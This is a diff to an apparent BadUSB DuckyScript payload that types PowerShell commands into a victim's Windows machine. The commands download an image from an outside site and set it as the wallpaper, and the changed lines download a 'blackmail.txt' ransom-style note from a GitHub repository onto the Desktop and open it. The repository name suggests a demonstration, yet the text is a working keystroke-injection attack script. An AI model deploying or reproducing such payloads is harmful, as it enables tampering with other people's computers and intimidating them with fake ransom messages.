@@ -36,13 +36,7 @@ DELAY 4000
 REM Change desktop
 STRING $u='https://img.4gamers.com.tw/puku-clone-version/04f6b840dcd746fca0693ca9c81788f60d318d3c.jpg'; $t="$env:TEMP\wallpaper.jpg"; Invoke-WebRequest -Uri $u -OutFile $t; Add-Type '[DllImport("user32.dll",SetLastError=true)]public static extern bool SystemParametersInfo(int uAction,int uParam,string lpvParam,int fuWinIni);' -Name Win32 -Namespace Win32Functions; [Win32Functions.Win32]::SystemParametersInfo(20,0,$t,3)
 ENTER
-DELAY 500
-REM Create a README.txt file on the Desktop with ASCII art and ransom message
-STRING $desktopPath = [System.Environment]::GetFolderPath('Desktop')
+DELAY 4000
+STRING $url='https://raw.githubusercontent.com/RWeng77/HackerSir_BadUSB_demo/refs/heads/main/blackmail.txt';$out="$env:USERPROFILE\Desktop\README.txt";Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing;Start-Process $out
 ENTER
-STRING $filePath = "$desktopPath\README.txt"
-ENTER
-STRING New-Item -Path $filePath -ItemType File -Force
-ENTER
-STRING notepad "$filePath"
-ENTER
+
